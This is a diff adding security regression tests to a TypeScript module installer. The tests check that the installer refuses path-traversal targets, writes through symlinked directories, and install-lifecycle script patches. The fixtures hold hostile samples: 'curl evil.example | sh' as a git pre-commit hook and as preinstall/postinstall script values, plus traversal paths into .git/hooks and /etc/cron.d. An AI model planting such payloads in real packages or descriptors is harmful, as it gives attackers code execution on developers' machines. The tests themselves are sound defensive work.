@@ -5,6 +5,7 @@ import {
   readFile,
   readlink,
   rm,
+  symlink,
   writeFile,
 } from "node:fs/promises";
 import { tmpdir } from "node:os";
@@ -1302,5 +1303,365 @@ describe("registry-item schema — config patches", () => {
       patches: {},
     });
     expect(result.valid).toBeFalsy();
+  });
+});
+
+// #98 Phase 1. `add` is the one engine that consumes an untrusted remote descriptor, and
+// it was the one engine without the guards `remover.ts` and `updater.ts` already use.
+// These tests drive the two holes the 2026-08-30 audit named: a `..` target that escapes
+// the project root, and a symlinked path component that carries an in-root write outside
+// it. Each asserts the refusal, not the happy path.
+
+// A malicious third-party descriptor: an ordinary-looking feature whose one file target
+// climbs out of the alias prefix and lands on a git hook.
+async function traversalModule(): Promise<LoadedModule> {
+  return writeModule(
+    "evil",
+    {
+      type: "saasaloy:feature",
+      files: [
+        {
+          path: "files/hook.sh",
+          target: "@web/../../../.git/hooks/pre-commit",
+        },
+      ],
+    },
+    { "files/hook.sh": "#!/bin/sh\ncurl evil.example | sh\n" }
+  );
+}
+
+describe("buildPlan — write-path containment (#98)", () => {
+  it("refuses a files[] target that climbs out of the project root", async () => {
+    await expect(
+      plan({
+        install: ["evil"],
+        modules: [await traversalModule()],
+        config: { aliases: { "@web": "apps/web/src" }, installed: [] },
+      })
+    ).rejects.toThrow(/escapes the project root|'\.' or '\.\.' segments/);
+  });
+
+  it("refuses a scaffold target that climbs out of its workspace and the root", async () => {
+    const mod = await writeModule(
+      "evil",
+      {
+        type: "saasaloy:capability",
+        scaffolds: [
+          {
+            workspace: "apps/api",
+            files: [{ path: "files/x.ts", target: "../../../outside.ts" }],
+          },
+        ],
+      },
+      { "files/x.ts": "export {};\n" }
+    );
+    await expect(plan({ install: ["evil"], modules: [mod] })).rejects.toThrow(
+      /Refusing to resolve/
+    );
+  });
+
+  it("refuses a patches[] file outside the project root", async () => {
+    const mod = await writeModule("evil", {
+      type: "saasaloy:feature",
+      patches: [
+        {
+          file: "../../.git/hooks/pre-commit",
+          kind: "package-json-script",
+          name: "db:generate",
+          value: "drizzle-kit generate",
+        },
+      ],
+    });
+    await expect(plan({ install: ["evil"], modules: [mod] })).rejects.toThrow(
+      /Refusing to resolve/
+    );
+  });
+
+  it("refuses an absolute files[] target", async () => {
+    const mod = await writeModule(
+      "evil",
+      {
+        type: "saasaloy:feature",
+        files: [{ path: "files/x.ts", target: "@web//etc/cron.d/evil" }],
+      },
+      { "files/x.ts": "export {};\n" }
+    );
+    await expect(
+      plan({
+        install: ["evil"],
+        modules: [mod],
+        config: { aliases: { "@web": "" }, installed: [] },
+      })
+    ).rejects.toThrow(/Refusing to resolve/);
+  });
+
+  it("still resolves an ordinary alias-prefixed target", async () => {
+    const mod = await writeModule(
+      "waitlist",
+      {
+        type: "saasaloy:feature",
+        files: [{ path: "files/x.ts", target: "@api/routes/waitlist.ts" }],
+      },
+      { "files/x.ts": "export {};\n" }
+    );
+    const p = await plan({
+      install: ["waitlist"],
+      modules: [mod],
+      config: { aliases: { "@api": "apps/api/src" }, installed: [] },
+    });
+    expect(p.files[0]?.targetAbs).toBe(
+      join(resolve(root), "apps", "api", "src", "routes", "waitlist.ts")
+    );
+  });
+});
+
+describe("executePlan — symlink refusal (#98)", () => {
+  let outside: string;
+
+  beforeEach(async () => {
+    outside = await mkdtemp(join(tmpdir(), "saasaloy-outside-"));
+  });
+
+  afterEach(async () => {
+    await rm(outside, { recursive: true, force: true });
+  });
+
+  it("refuses to write a module file through a symlinked directory component", async () => {
+    // `apps` is a link out of the project, so the lexically-in-root write would land outside.
+    await symlink(outside, join(root, "apps"), "dir");
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api"],
+      modules: [await apiWorkspace()],
+      config,
+      manifest,
+    });
+
+    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
+      /is a symlink/
+    );
+    await expect(
+      pathExists(join(outside, "api", "package.json"))
+    ).resolves.toBeFalsy();
+  });
+
+  it("refuses to patch a file reached through a symlinked directory component", async () => {
+    await mkdir(join(outside, "api"), { recursive: true });
+    await writeFile(
+      join(outside, "api", "package.json"),
+      '{\n  "name": "@app/api"\n}\n',
+      "utf-8"
+    );
+    await symlink(outside, join(root, "apps"), "dir");
+
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["database"],
+      modules: [await dbWithScript()],
+      config,
+      manifest,
+    });
+    expect(p.patches[0]?.action).toBe("apply");
+
+    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
+      /is a symlink/
+    );
+    await expect(
+      readFile(join(outside, "api", "package.json"), "utf-8")
+    ).resolves.not.toContain("db:generate");
+  });
+
+  it("refuses to create a skill link through a symlinked directory component", async () => {
+    await symlink(outside, join(root, ".claude"), "dir");
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api"],
+      modules: [await skillModule()],
+      config,
+      manifest,
+    });
+
+    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
+      /is a symlink/
+    );
+    await expect(pathExists(join(outside, "skills"))).resolves.toBeFalsy();
+  });
+
+  it("leaves the idempotent re-add of an existing skill link working", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const mod = await skillModule();
+    await executePlan(
+      await plan({ install: ["api"], modules: [mod], config, manifest }),
+      root,
+      config,
+      manifest
+    );
+    const second = await plan({
+      install: ["api"],
+      modules: [mod],
+      config,
+      manifest,
+    });
+    expect(second.links[0]?.action).toBe("exists");
+    // The link we made ourselves must not trip the symlink guard on a re-add.
+    const result = await executePlan(second, root, config, manifest);
+    expect(result.links).toHaveLength(1);
+    expect(
+      (await lstat(join(root, ".claude/skills/saasaloy-api"))).isSymbolicLink()
+    ).toBeTruthy();
+  });
+});
+
+describe("registry-item schema — traversal-proof paths (#98)", () => {
+  const traversalItem = {
+    name: "evil",
+    type: "saasaloy:feature" as const,
+    files: [
+      { path: "files/hook.sh", target: "@web/../../../.git/hooks/pre-commit" },
+    ],
+  };
+
+  it("rejects the malicious descriptor outright", async () => {
+    const result = await validateRegistryItem(traversalItem);
+    expect(result.valid).toBeFalsy();
+    expect(result.errors.join("\n")).toContain("target");
+  });
+
+  it("rejects a '.' segment in a files[] target", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:feature",
+      files: [{ path: "files/x.ts", target: "@api/./x.ts" }],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("rejects a trailing '..' segment in a files[] target", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:feature",
+      files: [{ path: "files/x.ts", target: "@api/routes/.." }],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("rejects a '..' segment in a scaffold target", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:capability",
+      scaffolds: [
+        {
+          workspace: "apps/api",
+          files: [{ path: "files/x.ts", target: "../../outside.ts" }],
+        },
+      ],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("rejects a '..' segment in a patches[] file", async () => {
+    const result = await validateRegistryItem({
+      name: "evil",
+      type: "saasaloy:feature",
+      patches: [
+        {
+          file: "apps/../../.git/hooks/pre-commit",
+          kind: "package-json-script",
+          name: "db:generate",
+          value: "drizzle-kit generate",
+        },
+      ],
+    });
+    expect(result.valid).toBeFalsy();
+  });
+
+  it("still accepts a dot-leading file name, which is not a dot segment", async () => {
+    const result = await validateRegistryItem({
+      name: "api",
+      type: "saasaloy:capability",
+      files: [{ path: "files/gitignore", target: "@api/.gitignore" }],
+      scaffolds: [
+        {
+          workspace: "apps/api",
+          files: [{ path: "files/dev.vars", target: ".dev.vars.example" }],
+        },
+      ],
+      patches: [
+        {
+          file: "apps/api/.eslintrc.json",
+          kind: "package-json-script",
+          name: "db:generate",
+          value: "drizzle-kit generate",
+        },
+      ],
+    });
+    expect(result.errors).toStrictEqual([]);
+    expect(result.valid).toBeTruthy();
+  });
+});
+
+describe("applier — install-lifecycle script refusal (#98)", () => {
+  // A descriptor that would earn arbitrary code execution on the victim's next install.
+  async function lifecycleModule(name: string): Promise<LoadedModule> {
+    return writeModule("evil", {
+      type: "saasaloy:feature",
+      dependsOn: ["api"],
+      patches: [
+        {
+          file: "apps/api/package.json",
+          kind: "package-json-script",
+          name,
+          value: "curl evil.example | sh",
+        },
+      ],
+    });
+  }
+
+  it.each([
+    "preinstall",
+    "install",
+    "postinstall",
+    "prepare",
+    "prepublish",
+    "prepublishOnly",
+  ])("refuses a %s patch and writes nothing", async (name) => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api", "evil"],
+      modules: [await apiWorkspace(), await lifecycleModule(name)],
+      config,
+      manifest,
+    });
+    expect(p.patches[0]?.action).toBe("unchanged");
+
+    const result = await executePlan(p, root, config, manifest);
+
+    expect(result.patched).toStrictEqual([]);
+    expect(result.patchRefusals).toHaveLength(1);
+    expect(result.patchRefusals[0]?.reason).toContain(name);
+    const pkg = JSON.parse(
+      await readFile(join(root, "apps", "api", "package.json"), "utf-8")
+    ) as { scripts: Record<string, string> };
+    expect(pkg.scripts).toStrictEqual({ dev: "wrangler dev" });
+    // Nothing refused is tracked, so `remove` never claims to own the file.
+    expect(manifest.patches).toStrictEqual([]);
+  });
+
+  it("still applies an ordinary script whose name merely starts with a lifecycle word", async () => {
+    const config = emptyConfig();
+    const manifest = emptyManifest();
+    const p = await plan({
+      install: ["api", "evil"],
+      modules: [await apiWorkspace(), await lifecycleModule("installer:check")],
+      config,
+      manifest,
+    });
+    const result = await executePlan(p, root, config, manifest);
+    expect(result.patched).toHaveLength(1);
   });
 });
